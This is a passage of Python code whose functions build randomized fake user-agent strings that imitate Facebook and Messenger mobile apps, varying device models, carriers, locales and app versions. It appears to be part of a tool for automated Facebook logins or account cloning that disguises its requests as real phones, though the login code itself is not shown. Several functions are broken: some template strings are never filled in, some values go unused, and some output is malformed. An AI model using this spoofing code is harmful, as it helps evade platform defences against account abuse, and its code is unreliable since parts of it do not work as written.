OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBIOS;FBAV/151.0.0.61.202;FBBV/82156572;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/SFR;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/83160404]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534883268;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_Qaau_IT;FBOP/5;FBRV/537932531]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 [FBAN/FBIOS;FBAV/441.1.0.27.105;FBBV/539464914;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/541069100]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/276.0.0.32.107;FBBV/235827610;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/469153370;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/471145542]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/627850395;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/630494309;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/FBIOS;FBAV/174.0.0.48.98;FBBV/110921384;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/3;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/112241032]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/159.0.0.48.97;FBBV/91994325;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/92489346]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 [FBAN/FBIOS;FBAV/155.0.0.36.93;FBBV/87992437;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.1.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/89136215]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBAV/182.0.0.42.80;FBBV/118457561;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/POST;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/119485025]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/165.0.0.74.96;FBBV/100174821;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/100948865]'])
    ___ERROR_ON_FIRE___ = ''+str(iphone3)+' '+str(agent3)
    return ___ERROR_ON_FIRE___

def _____UpDaTe_S1_____():
    fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
    fbbv3 = str(random.randint(111111111, 999999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
    fbrv3 = str(random.randint(333333333, 999999999))
    fbcr3 = random.choice(["Banglalink", "Airtel", "Robi", "Grameenphone", "Teletalk", "U.S. Cellular", "Verizon", "Verizon Wireless", "Cricket", "Google Fi", "T-Mobile", "AT&T", "Sprint","Metro by T-Mobile","Boost Mobile","TracFone Wireless","Xfinity Mobile","Mint Mobile","Visible","Republic Wireless","Consumer Cellular","Straight Talk","Spectrum Mobile","Ting","H2O Wireless","FreedomPop","Boost Infinite","Simple Mobile","Pure Talk","C-Spire Wireless","SouthernLINC Wireless","GCI Wireless","Bluegrass Cellular","Nex-Tech Wireless","T-Mobile Prepaid","Ultra Mobile","TracFone","Freedom Wireless","MetroPCS","Cellcom","Nextel","Cricket Wireless"])
    fbmf3 = 'samsung';fbbd3 = 'samsung'
    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
    fb3=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    ___Noor_on_Fire___ = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
    return ___Noor_on_Fire___

def _____UpDaTe_S2_____():
    fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
    fbbv3 = str(random.randint(111111111, 999999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
    fbrv3 = str(random.randint(333333333, 999999999))
    fbcr3 = random.choice(["Banglalink", "Airtel", "Robi", "Grameenphone", "Teletalk", "U.S. Cellular", "Verizon", "Verizon Wireless", "Cricket", "Google Fi", "T-Mobile", "AT&T", "Sprint","Metro by T-Mobile","Boost Mobile","TracFone Wireless","Xfinity Mobile","Mint Mobile","Visible","Republic Wireless","Consumer Cellular","Straight Talk","Spectrum Mobile","Ting","H2O Wireless","FreedomPop","Boost Infinite","Simple Mobile","Pure Talk","C-Spire Wireless","SouthernLINC Wireless","GCI Wireless","Bluegrass Cellular","Nex-Tech Wireless","T-Mobile Prepaid","Ultra Mobile","TracFone","Freedom Wireless","MetroPCS","Cellcom","Nextel","Cricket Wireless"])
    fbmf3 = 'samsung';fbbd3 = 'samsung'
    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
    fb3=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    agent3 = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
    iphone3 = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/158.0.0.44.98;FBBV/90997758;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/en_US;FBOP/5;FBRV/90997758]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/672970693;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/674179525;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H350 [FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/696635672;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/700448384;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D82 [FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/707243085;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/704769221;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/708017881;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBIOS;FBAV/151.0.0.61.202;FBBV/82156572;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/SFR;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/83160404]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534883268;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_Qaau_IT;FBOP/5;FBRV/537932531]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 [FBAN/FBIOS;FBAV/441.1.0.27.105;FBBV/539464914;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/541069100]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/276.0.0.32.107;FBBV/235827610;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/469153370;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/471145542]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/627850395;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/630494309;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/FBIOS;FBAV/174.0.0.48.98;FBBV/110921384;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/3;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/112241032]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/159.0.0.48.97;FBBV/91994325;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/92489346]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 [FBAN/FBIOS;FBAV/155.0.0.36.93;FBBV/87992437;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.1.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/89136215]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBAV/182.0.0.42.80;FBBV/118457561;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/POST;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/119485025]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/165.0.0.74.96;FBBV/100174821;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/100948865]'])
    ___Noor_on_Fire___ = ''+str(iphone3)+' '+str(agent3)
    return ___Noor_on_Fire___

def __UPX__():
    ua1 = "[FBAN/FB4A;FBAV/388.0.0.32.105;FBBV/317616396;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9070;FBSV/2.3.6;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua2 = "[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/316215288;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/FBCR/Teletalk;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1024;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua3 = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=2016};FBLC/en_US;FBRV/FBCR/Grameenphone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1721;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua4 = "[FBAN/FB4A;FBAV/389.0.0.42.111;FBBV/317817218;FBDM/{density=4.0,width=1440,height=2368};FBLC/en_US;FBRV/FBCR/Robi;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto Z (2);FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    ua5 = "[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/315414711;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Airtel;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    __uaxx__ = random.choice([ua1,ua2,ua3,ua4,ua5])
    __max__ = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{__uaxx__}'
    return str(__max__)

def shajon():
    END = '[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935FD;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
    ua = f'''Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + END
    return ua

def sanjida():
    vchrome = str(random.randint(100, 925)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150))
    VAPP = random.randint(410000000, 499999999)
    END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'''Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + END
    return ua

def cent6():
    END = '[FBAN/FB4A;FBAV/88.0.0.22.76;FBBV/35266892;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/vodafone IT;FBMF/KOMU;FBBD/KOMU;FBPN/com.facebook.katana;FBDV/Komu Color;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model3)}  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def ethan6():
    END = '[FBAN/Orca-Android;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=2.5,width=720,height=1280};FBLC/en_BD;FBCR/null;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH1893;FBSV/10;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi;]"'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model3)}  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def UA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    c = ";[FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]"
    d = ";[FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]"
    ua = a+b+c+d
    return ua
    
def UA1():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua    

def UAA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua

def randua():
	abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
	pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])
	build = random.choice(abc)+random.choice(abc)+random.choice(abc)
	FBBV = str(random.randint(111111111,999999999))
	FBCR = random.choice(["Jazz","Zong","Mobilink","Ufone"])
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/34.0.0.3318;FBBV/3438742;[FBAN/FB4A;FBAV/196.0.0.79;FBBV/442082200;FBDM/{density=2.0,width=1280,height=1440};FBLC/en_AU;FBRV/886067563;FBCR/MobileNation;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1971;FBSV/10.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",])
	return ua
	
def sawg():
	model = random.choice(["Redmi 6","Redmi 7","Redmi 8","Redmi 5","Redmi 4","Redmi 3","Redmi 2"])
	bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/451.0.0.45.109;FBBV/449217850;FBDM/"+"{density=2.75,width=1080,height=2168}"+f";FBLC/en_US;FBRV/441815108;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{model};FBSV/5.1.1;FBOP/1;FBCA/arm64-v8a:;]"
	return bal

def ua1():
    alex1 = str(random.randint(100,400))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    alex9 = str(random.randint(200,400))+".0.0."+str(random.randint(7,37))+"."+str(random.randint(101,151))
    alex2 = random.randint(410000000,499999999)
    cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])  
    ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)};  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})"+"[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/110.0.0.17.29FBBV/8243059FBDM/{density=3.0,width=840,height=953}FBLC/zh_CNFBRV/8304687FBCR/Boost MobileFBMF/SamsungFBBD/SamsungFBPN/com.facebook.katanaFBDV/SM-G973FFBSV/5.0FBOP/1FBCA/x86:armeabi-v7a]"
    return ua

def warlee():
    and_ver = str(random.randrange(9,12))
    app_ver = str(random.randint(111,999))+".0.0."+str(random.randrange(9,99))+"."+str(random.randint(111,333))
    app_ver1 = str(random.randint(111,999))+".0.0."+str(random.randrange(9,99))+"."+str(random.randint(111,333))
    app_ver_code = str(random.randint(111111111,999999999))
    app_ver_code1 = str(random.randint(111111111,999999999))
